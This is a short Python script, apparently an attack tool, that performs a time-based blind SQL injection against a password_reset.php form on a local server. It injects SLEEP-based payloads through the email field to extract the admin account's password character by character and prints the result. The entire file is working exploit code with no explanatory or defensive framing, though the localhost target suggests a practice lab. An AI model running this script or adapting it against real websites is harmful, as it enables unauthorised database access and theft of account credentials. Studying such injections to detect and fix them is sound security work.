import requests
import string
import time

URL = 'http://127.0.0.1:8080/password_reset.php'  
DELAY = 5
THRESHOLD = 4.5
CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()_+-={}[]|:;<>,.?/~`"  
MAX_LENGTH = 40  # Slightly bigger
TARGET_CONDITION = "username='admin'"  # Focusing on admin's password


extracted = ''

print("[*] Starting Blind SQL Injection...")

for position in range(1, MAX_LENGTH + 1):
    found_char = False
    for char in CHARSET:
        payload = (
            f"' OR (SELECT IF(SUBSTRING(BINARY (SELECT password FROM users WHERE {TARGET_CONDITION} LIMIT 1),"
            f"{position},1)='{char}', SLEEP({DELAY}), 0))-- "
        )

        data = {
            'email': payload
        }

        start_time = time.time()
        try:
            response = requests.post(URL, data=data, timeout=DELAY + 2)
            elapsed = time.time() - start_time
        except requests.exceptions.Timeout:
            elapsed = DELAY + 1

        if elapsed > THRESHOLD:
            extracted += char
            print(f"[+] Found character at position {position}: {char}")
            found_char = True
            break

    if not found_char:
        print(f"[-] No more characters found at position {position}. Ending extraction.")
        break

print(f"\n[*] Extraction complete! Retrieved password: {extracted}")
